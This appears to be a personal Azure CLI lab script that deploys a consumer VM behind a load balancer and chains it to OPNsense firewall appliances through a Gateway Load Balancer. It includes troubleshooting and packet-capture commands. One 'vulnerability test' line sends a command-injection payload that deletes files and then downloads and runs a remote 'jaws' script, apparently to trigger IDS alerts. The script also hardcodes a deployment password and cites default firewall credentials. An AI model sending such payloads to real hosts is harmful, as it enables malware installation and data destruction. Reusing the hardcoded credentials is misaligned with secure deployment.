
### AZ CLI 
az login
#List all your subscriptions
az account list -o table --query "[].{Name:name, IsDefault:isDefault}"
#List default Subscription being used
az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table

# You can provision both Consumer and Provider in the same Subscription
# In case you want to do it separated Subscription change your active subscription as shown
az account set --subscription VSE-SUB  #My personal MSDN Subscription
az account set --subscription DMAUSER-MS #My Microsoft Internal Subscription

### Consumer ###
# Define variables based on your requirements
consumer_rg=gwlb-lab2
consumer_location=centralus
consumervnetcidr="10.100.0.0/24"
consumersubnet="10.100.0.0/27"
consumerbastionsubnet="10.100.0.32/27"
mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
echo "Type username and password"
read -p 'Username: ' username && read -sp 'Password: ' password 

# 1) Create Consumer VNET and subnet
az group create --name $consumer_rg --location $consumer_location --output none
az network vnet create --resource-group $consumer_rg --name consumer-vnet --location $consumer_location --address-prefixes $consumervnetcidr --subnet-name vmsubnet --subnet-prefix $consumersubnet --output none

# 2) #(Optional) UDR to restrict SSH access to Azure VMs from your Public IP only:
az network nsg create --resource-group $consumer_rg --name consumer-nsg --location $consumer_location
az network nsg rule create \
    --resource-group $consumer_rg \
    --nsg-name consumer-nsg \
    --name AllowSSHRule \
    --direction Inbound \
    --priority 100 \
    --source-address-prefixes $mypip/32 \
    --source-port-ranges '*' \
    --destination-address-prefixes '*' \
    --destination-port-ranges 22 \
    --access Allow \
    --protocol Tcp \
    --description "Allow inbound SSH" \
    --output none
az network nsg rule create \
    --resource-group $consumer_rg \
    --nsg-name consumer-nsg \
    --name allow-http \
    --direction Inbound \
    --priority  101 \
    --source-address-prefixes '*' \
    --source-port-ranges '*' \
    --destination-address-prefixes '*' \
    --destination-port-ranges 80 \
    --access Allow \
    --protocol Tcp \
    --description "Allow inbound HTTP" \
    --output none
az network vnet subnet update --name vmsubnet --resource-group $consumer_rg --vnet-name consumer-vnet --network-security-group consumer-nsg --output none

# 3) Create Public Load Balancer
az network lb create -g $consumer_rg --name consumer-elb --sku Standard --frontend-ip-name frontendip1 --backend-pool-name vmbackend --output none
az network lb probe create -g $consumer_rg --lb-name consumer-elb --name httpprobe --protocol tcp --port 80 --output none
az network lb rule create -g $consumer_rg --lb-name consumer-elb --name http-lb-rule --protocol TCP --frontend-ip-name frontendip1 --backend-pool-name vmbackend --probe-name httpprobe --frontend-port 80 --backend-port 80 --output none
az network lb inbound-nat-rule create -g $consumer_rg --lb-name consumer-elb -n sshnat --protocol Tcp --frontend-port 50000 --backend-port 22

# 4) Deploy Azure VM with NGX using a simple test Website
az network nic create --resource-group $consumer_rg -n consumer-vm-nic --location $consumer_location --subnet vmsubnet --vnet-name consumer-vnet --output none
az vm create -n consumer-vm -g $consumer_rg --image UbuntuLTS --size Standard_B1s --admin-username $username --admin-password $password --nics consumer-vm-nic --no-wait --location $consumer_location --output none

# ) Attach VM to LB Rule and NAT Rule
az network nic ip-config address-pool add --address-pool vmbackend --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
az network nic ip-config inbound-nat-rule add --inbound-nat-rule sshnat --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none

# 6) Install nginx and test website (Move this to cloud.ini)
az vm extension set --resource-group $consumer_rg --vm-name consumer-vm --name CustomScript --settings '{"commandToExecute": "apt-get -y update && apt-get -y install nginx && echo Test Website on consumer-vm > /var/www/html/index.html"}' --publisher Microsoft.Azure.Extensions --no-wait

# 7) Deploy Bastion
az network vnet subnet create --resource-group $consumer_rg --name AzureBastionSubnet --vnet-name consumer-vnet --address-prefixes $consumerbastionsubnet --output none
az network public-ip create --resource-group $consumer_rg --name consumer-bastion-pip --sku Standard --location $consumer_location
az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location

### Provider ###

### AZ CLI (Optional) - In case you want to deploy Provider in another Subscription
az login
#List all your subscriptions
az account list -o table --query "[].{Name:name, IsDefault:isDefault}"
#List default Subscription being used
az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table

# You can provision both Consumer and Provider in the same Subscription
# In case you want to do it separated Subscription change your active subscription as shown
az account set --subscription VSE-SUB  #My personal MSDN Subscription
az account set --subscription DMAUSER-MS #My Microsoft Internal Subscription

#Variables - Make changes based on your needs.
provider_rg=glb-lab5
provider_location=centralus
providervnetcidr="10.0.0.0/24"
providerexternalcidr="10.0.0.0/27"
providerinternalcidr="10.0.0.32/27"
providerbastionsubnet="10.0.0.64/27"
nva=provider-nva
mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)

# 1) Create provider VNET and Internal/External 
az group create --name $provider_rg --location $provider_location --output none
az network vnet create --resource-group $provider_rg --name provider-vnet --location $provider_location --address-prefixes $providervnetcidr --subnet-name external --subnet-prefix $providerexternalcidr --output none
az network vnet subnet create --name internal --resource-group $provider_rg --vnet-name provider-vnet --address-prefix $providerinternalcidr --output none

# 2) Deploy both OPNsense NVA (work on this)
az deployment group create --name $nva-deploy-$RANDOM --resource-group $provider_rg \
--template-uri "https://raw.githubusercontent.com/dmauser/azure-gateway-lb/main/bicep/glb-active-active.json" \
--parameters virtualMachineSize=Standard_B2s virtualMachineName=$nva TempUsername=azureuser TempPassword=Msft123Msft123 existingVirtualNetworkName=provider-vnet existingUntrustedSubnet=external existingTrustedSubnet=internal PublicIPAddressSku=Standard \
--no-wait

# Password specified above is not used, only during deployment. 
# After deployment you can access OPNsense by using elb Public IP on port 50443 (first instance), 50444 (secondary instance)
# It is recommended you to manage only primary and syncronize configuration with secondary.
# Default username is: root and default password is: opnsense

# 3) Deploy Bastion (Optional) - You can access OPNSense by SSH via Bastion to perform troubleshooting.
az network vnet subnet create --resource-group $provider_rg --name AzureBastionSubnet --vnet-name provider-vnet --address-prefixes $providerbastionsubnet --output none
az network public-ip create --resource-group $provider_rg --name provider-bastion-pip --sku Standard --location $provider_location --output none
az network bastion create --name provider-bastion --sku basic  --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location

# Attach LB to GW (different subscriptions - Portal only works for the same subscription)
# Check current sub
az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
# Subscription where Consumer is.
az account set --subscription MSDN_Dmauser  #MSDN ---> Change to your subscription name
feid=$(az network lb frontend-ip show -g $provider_rg --lb-name provider-nva-glb --name FW --query id --output tsv)
echo $feid

# Sub where Provider is:
# Add GLB chain
az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $feid --output none

# Validate GLB chain
az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
az network lb frontend-ip show -g $consumer_rg --name frontendip1 --lb-name consumer-elb --query gatewayLoadBalancer.id -o tsv

#Remove GLB chain
az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb ""


#### Troubleshooting/Advanced validations
#Check traffic VxLAN traffic OPNSense after chaining with LB
tcpdump -n -i hn1 host 10.0.0.36

### Network Capture OPNSense
#Inbound (External Interface)
tcpdump -n -i vxlan0
#Outbound (External Interface)
tcpdump -n -i vxlan1 

# Vulnerability Test (Enable IDS on OPNsense)
curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws

# Connectivity Checks / Replace the Public IP listed below with your LB.
# Get you LB Public IP:
az account set --subscription DMAUSER-MS #Microsoft
consumerelbpip=$(az network public-ip show -g $consumer_rg --name PublicIPconsumer-elb --query ipAddress -o tsv)


## Port 50000 - NAT Rule to 22 Consumer-VM Backend

# Use the output below to run your connectivity tests. 
#Tests on Windows 
echo psping -t $consumerelbpip 
echo psping -t $consumerelbpip:50000
echo psping -t $consumerelbpip:50000


# Use Linux (requires install packages)
sudo hping3 40.77.94.253 -S -p 50000
sudo nping --tcp 40.77.94.253 -p 80 -c 50000

# Port 80 - LB Rule HTTP
psping -t 40.77.94.253:80
sudo hping3 40.77.94.253 -S -p 80
sudo nping --tcp 40.77.94.253 -p 80 -c 1000
nc -v -z 40.77.94.253 80
curl 40.77.94.253

# Test Consumer-VM Oubound Traffic via GLB
ssh dmauser@40.77.94.253 -p 50000 
nc -v -z 8.8.8.8 53

# Consumer Jumpbox
ssh dmauser@40.122.156.70

#OPN Capture oubound traffic 
tcpdump -n -i vxlan1 host 8.8.8.8 


# Recommended for savings
# Set variables
$consumer_rg=
$consumer_location=
$provider_rg=
$provider_location=
# 1) Delete Bastion (later move this process to Bicep)
az network bastion delete --resource-group $consumer_rg --name consumer-bastion
az network bastion delete --resource-group $provider_rg --name provider-bastion 
# 2) Add Bastion
az network bastion create --name provider-bastion --sku basic --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location --no-wait
az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location --no-wait
# Wait about 5 minutes to complete Bastion deployment.


#Troubleshooting
# Compare settings  Internal/External Port/ID and your load balancer.

ifconfig bridge0 destroy
ifconfig vxlan0 destroy
ifconfig vxlan1 destroy

ifconfig vxlan2 destroy

setenv gwlbip 10.0.0.36
setenv extid 901
setenv extport 10801
setenv intid 900
setenv intport 10800
setenv opnlanip 10.0.0.37

ifconfig hn0 mtu 4000
ifconfig hn1 mtu 4000

ifconfig vxlan create vxlanid $extid vxlanlocal $opnlanip vxlanlocalport $extport vxlanremote $gwlbip vxlanremoteport $extport
ifconfig vxlan create vxlanid $intid vxlanlocal $opnlanip vxlanlocalport $intport vxlanremote $gwlbip vxlanremoteport $intport

ifconfig bridge0 create
ifconfig bridge0 addm vxlan0
ifconfig bridge0 addm vxlan1

ifconfig vxlan0 up
ifconfig vxlan1 up
ifconfig bridge0 up
